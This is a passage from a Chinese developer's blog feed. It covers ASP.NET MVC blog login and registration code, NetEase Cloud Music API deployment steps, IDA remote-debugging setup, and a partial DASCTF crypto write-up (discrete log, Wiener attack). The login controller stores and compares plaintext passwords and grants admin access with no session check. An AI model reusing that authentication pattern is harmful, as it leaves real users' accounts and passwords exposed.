punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>editor<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">display</span><span class="token punctuation">:</span>none<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            ### 关于 Editor.md            **Editor.md** 是一款开源的、可嵌入的 Markdown 在线编辑器（组件），基于 CodeMirror、jQuery 和 Marked 构建。        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、权限鉴别"><a href="#五、权限鉴别" class="headerlink" title="五、权限鉴别"></a>五、权限鉴别</h2><p>​    终于写到鉴权的部分了，这个是网站的重中之重啊，稍不注意就是个高危漏洞。。。</p><p>​    这里我准备采取ASP的cookie的鉴权方式，并且设定一个cookie的过期时间，也是为了防止部分xss和ssrf。emmm，这个鉴权的第一个部分呢，就是login的那里了，肯定是要在这里设置初始的cookie的，但是先是需要处理login是否成功。</p><h3 id="1-登录判定-确认密码"><a href="#1-登录判定-确认密码" class="headerlink" title="1. 登录判定(确认密码)"></a>1. 登录判定(确认密码)</h3><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">public ActionResult Login(string username, string password)&#123;    string truepass &#x3D; &quot;&quot;;    foreach (var pass in db.userinfo.Where(user &#x3D;&gt; user.username &#x3D;&#x3D; username))    &#123;        truepass &#x3D; pass.password;    &#125;    if (password &#x3D;&#x3D; truepass)    &#123;        string page &#x3D; Url.Action(&quot;Index&quot;, &quot;Admin&quot;);        return Redirect(page);    &#125;    else    &#123;        ViewBag.IsLoginError &#x3D; true;        return View();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里设置了一个<code>ViewBag.IsLoginError</code>的值，代表的是是否登陆失败，true表示登陆失败，当登录失败时，html上面做出一个提示，代码如下。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".alert"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".alert"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> timeVal <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"small"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> timer <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"small"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token operator">--</span>timeVal <span class="token operator">+</span> <span class="token string">" 秒后消失"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>timeVal <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">clearInterval</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>@&#123;    if (ViewBag.IsLoginError != null)    &#123;        if (ViewBag.IsLoginError)        &#123;            ViewBag.IsLoginError = false;            <span class="token comment">&lt;!--登陆失败--></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alert alert-danger<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span> <span class="token property">margin-bottom</span><span class="token punctuation">:</span> -74.4667px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>toast-header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mr-auto text-primary<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>登陆失败<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>small</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-muted<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>3 秒后消失<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>small</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ml-2 mb-1 close<span class="token punctuation">"</span></span> <span class="token attr-name">data-dismiss</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alert<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>×<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>toast-body<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    密码错误，请检查你的用户名和密码                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-权限维持-使用Cookie"><a href="#2-权限维持-使用Cookie" class="headerlink" title="2. 权限维持(使用Cookie)"></a>2. 权限维持(使用Cookie)</h3><p>先创建一个全局的cookie，然后这里我准备给这个全局的cookie命名为</p><h2 id="六、注册用户名唯一"><a href="#六、注册用户名唯一" class="headerlink" title="六、注册用户名唯一"></a>六、注册用户名唯一</h2><p>这个的逻辑跟上面的login的密码判断的逻辑是相似的，所以代码我直接copy出来了，稍加改动即可。</p><h1 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h1><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">[HttpPost]public ActionResult Register([Bind(Include &#x3D; &quot;username,password,email&quot;)] userinfo userinfo)&#123;    if (ModelState.IsValid)    &#123;        userinfo.Id &#x3D; db.userinfo.Count();        &#x2F;&#x2F;验证username的唯一性，如果username已存在则不给添加        foreach (var name in db.userinfo.Where(user &#x3D;&gt; user.username &#x3D;&#x3D; userinfo.username))        &#123;            ViewBag.IsRegistered &#x3D; true;            return View(userinfo);        &#125;        db.userinfo.Add(userinfo);        db.SaveChanges();        return RedirectToAction(&quot;Login&quot;);    &#125;    return View(userinfo);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Register-cshtml"><a href="#Register-cshtml" class="headerlink" title="Register.cshtml"></a>Register.cshtml</h1><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".alert"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".alert"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> timeVal <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"small"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> timer <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"small"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token operator">--</span>timeVal <span class="token operator">+</span> <span class="token string">" 秒后消失"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>timeVal <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">clearInterval</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>@&#123;    if (ViewBag.IsRegistered != null)    &#123;        if (ViewBag.IsRegistered)        &#123;            ViewBag.IsRegistered = false;            <span class="token comment">&lt;!--用户名已存在--></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alert alert-danger<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span> <span class="token property">margin-bottom</span><span class="token punctuation">:</span> -74.4667px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>toast-header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mr-auto text-primary<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>注册失败<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>small</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-muted<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>3 秒后消失<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>small</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ml-2 mb-1 close<span class="token punctuation">"</span></span> <span class="token attr-name">data-dismiss</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alert<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>×<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>toast-body<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    用户名已存在，请修改你的用户名                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="七、文章保存"><a href="#七、文章保存" class="headerlink" title="七、文章保存"></a>七、文章保存</h2><p>​    之所以把这个内容放在注册登录之后是因为开始的时候我也没想好把这个写好的博客文件保存在哪里合适，我想我这个博客显示的参数传的应该可以是文章号，即把文章转换生成的html单独放在一个文件夹之中</p><h1 id="网易云项目文档"><a href="#网易云项目文档" class="headerlink" title="网易云项目文档"></a>网易云项目文档</h1><h2 id="一、使用的API"><a href="#一、使用的API" class="headerlink" title="一、使用的API"></a>一、使用的API</h2><p>使用的是一个开源的API项目，项目地址为</p><p><a href="https://github.com/Binaryify/NeteaseCloudMusicApi">https://github.com/Binaryify/NeteaseCloudMusicApi</a></p><p>这里主要使用的是这个api的搜索与下载地址的功能，这个项目的部署方式在文档里面写得也很清楚。</p><h3 id="docker使用失败"><a href="#docker使用失败" class="headerlink" title="docker使用失败"></a>docker使用失败</h3><p>这里我本准备在我的VPS里面使用docker部署一个容器，易于管理。但是涉及到了一些我从没见过得报错，就直接放弃了使用docker来部署的想法，这里还是直接在VPS里面安装一下Nodejs吧。</p><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker">docker run <span class="token punctuation">-</span>d <span class="token punctuation">-</span><span class="token punctuation">-</span>name CloudMusic <span class="token punctuation">-</span>p 3000<span class="token punctuation">:</span>3000 binaryify/netease_cloud_music_apidocker run <span class="token punctuation">-</span>d <span class="token punctuation">-</span>p 3000<span class="token punctuation">:</span>3000 <span class="token punctuation">-</span><span class="token punctuation">-</span>name CloudMusic <span class="token punctuation">-</span>e http_proxy= <span class="token punctuation">-</span>e https_proxy= <span class="token punctuation">-</span>e no_proxy= <span class="token punctuation">-</span>e HTTP_PROXY= <span class="token punctuation">-</span>e HTTPS_PROXY= <span class="token punctuation">-</span>e NO_PROXY= binaryify/netease_cloud_music_api<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="直接在VPS上面安装Node使用"><a href="#直接在VPS上面安装Node使用" class="headerlink" title="直接在VPS上面安装Node使用"></a>直接在VPS上面安装Node使用</h3><h4 id="安装node"><a href="#安装node" class="headerlink" title="安装node"></a>安装node</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">wget -c https:&#x2F;&#x2F;nodejs.org&#x2F;dist&#x2F;v16.13.0&#x2F;node-v16.13.0.tar.gztar -zxvf node-v16.13.0.tar.gzcd node-v16.13.0sudo yum install gcc gcc-c++.&#x2F;configuremakesudo make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是上面的命令安装nodejs的话，编译的太慢了，这里可以安装比较低的版本，使用yum安装即可，方便快捷</p><pre class="line-numbers language-none"><code class="language-none">yum install nodejs# 查看node版本[root@VM-12-8-centos node]# node -vv10.24.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可惜安装的不是最新的版本，但是对于我们使用来说是已经够用了。</p><h4 id="安装cloudmusic接口程序"><a href="#安装cloudmusic接口程序" class="headerlink" title="安装cloudmusic接口程序"></a>安装cloudmusic接口程序</h4><pre class="line-numbers language-none"><code class="language-none">git clone git@github.com:Binaryify&#x2F;NeteaseCloudMusicApi.gitnpm installnode app.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="二、搜索功能实现"><a href="#二、搜索功能实现" class="headerlink" title="二、搜索功能实现"></a>二、搜索功能实现</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用ida进行动态调试的配置</title>
      <link href="2021/09/27/%E4%BD%BF%E7%94%A8ida%E8%BF%9B%E8%A1%8C%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%9A%84%E9%85%8D%E7%BD%AE/"/>
      <url>2021/09/27/%E4%BD%BF%E7%94%A8ida%E8%BF%9B%E8%A1%8C%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h3 id="ELF文件的动态调试"><a href="#ELF文件的动态调试" class="headerlink" title="ELF文件的动态调试"></a>ELF文件的动态调试</h3><p>这里首先打开ida的文件夹，在里面找到dbgsrv文件夹，里面有几个服务端的文件。找到你用做服务器的机子上面适合的文件执行。</p><p><img src="/2021/09/27/%E4%BD%BF%E7%94%A8ida%E8%BF%9B%E8%A1%8C%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%9A%84%E9%85%8D%E7%BD%AE/image-20210927155753619.png" alt></p><p>这里我的ip:port为<code>192.168.10.146:23946</code>。然后在ida中直接点击绿色的执行符号会让进行配置，配置的主要是ip与port，文件可以直接yes点击选择从windows复制到linux系统里面，复制的默认路径就是服务端文件的路径。</p><p><img src="/2021/09/27/%E4%BD%BF%E7%94%A8ida%E8%BF%9B%E8%A1%8C%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%9A%84%E9%85%8D%E7%BD%AE/image-20210927161100687.png" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ida </tag>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF9月赛 X 浙江工业大学秋季挑战赛</title>
      <link href="2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>从这篇文章开始，接下来还是一个比赛放一篇文章里面了，感觉还是这样搞比较好交流，篇幅也短，到时候复习的时候直接哪里不会搜关键词也行。</p><h2 id="Crypto-赛后补打完"><a href="#Crypto-赛后补打完" class="headerlink" title="Crypto (赛后补打完)"></a>Crypto (赛后补打完)</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> randomflag<span class="token operator">=</span><span class="token string">b'flag&#123;******************&#125;'</span>n <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">256</span>flaglong<span class="token operator">=</span>bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>m <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span>  <span class="token comment"># 如果random函数获得的是偶数，则将其+1转换为奇数</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> flaglong<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'m = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># m = 73964803637492582853353338913523546944627084372081477892312545091623069227301</span><span class="token comment"># c = 21572244511100216966799370397791432119463715616349800194229377843045443048821</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>全部都给出了基本上，直接就是一个简单的离散对数的问题</p><script type="math/tex; mode=display">c=m^{flag} \quad mod \quad n</script><p>这里的c、m、n都给出来了，直接写脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> sympyn <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">256</span>m <span class="token operator">=</span> <span class="token number">73964803637492582853353338913523546944627084372081477892312545091623069227301</span>c <span class="token operator">=</span> <span class="token number">21572244511100216966799370397791432119463715616349800194229377843045443048821</span>flaglong <span class="token operator">=</span> sympy<span class="token punctuation">.</span>discrete_log<span class="token punctuation">(</span>n<span class="token punctuation">,</span> c<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>flaglong<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># b'flag&#123;DASCTF_zjut&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h3><h4 id="1-代码如下"><a href="#1-代码如下" class="headerlink" title="1. 代码如下"></a>1. 代码如下</h4><blockquote><p>维纳攻击</p></blockquote><p>这种简单又复杂的题一般都是经不起分析的，这里简单分析一下就知道是怎么回事了。首先代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> flag <span class="token keyword">import</span> get_flag<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha512<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span>bytes_to_long<span class="token keyword">from</span> libnum <span class="token keyword">import</span> invmod<span class="token punctuation">,</span> gcd<span class="token keyword">import</span> random<span class="token keyword">def</span> <span class="token function">m_exit</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span> <span class="token string">"==============Game Over!================="</span>exit<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cal_bit</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> l<span class="token operator">-</span><span class="token number">2</span><span class="token keyword">def</span> <span class="token function">pi_b</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>bt <span class="token operator">=</span> 536380958350616057242691418634880594502192106332317228051967064327642091297687630174183636288378234177476435270519631690543765125295554448698898712393467267006465045949611180821007306678935181142803069337672948471202242891010188677287454504933695082327796243976863378333980923047411230913909715527759877351702062345876337256220760223926254773346698839492268265110546383782370744599490250832085044856878026833181982756791595730336514399767134613980006467147592898197961789187070786602534602178082726728869941829230655559180178594489856595304902790182697751195581218334712892008282605180395912026326384913562290014629187579128041030500771670510157597682826798117937852656884106597180126028398398087318119586692935386069677459788971114075941533740462978961436933215446347246886948166247617422293043364968298176007659058279518552847235689217185712791081965260495815179909242072310545078116020998113413517429654328367707069941427368374644442366092232916196726067387582032505389946398237261580350780769275427857010543262176468343294217258086275244086292475394366278211528621216522312552812343261375050388129743012932727654986046774759567950981007877856194574274373776538888953502272879816420369255752871177234736347325263320696917012616273L<span class="token keyword">return</span> invmod<span class="token punctuation">(</span>x<span class="token punctuation">,</span> bt<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_ed</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span>k <span class="token operator">=</span> cal_bit<span class="token punctuation">(</span>q<span class="token operator">*</span>p<span class="token punctuation">)</span>phi_n <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>r <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>u <span class="token 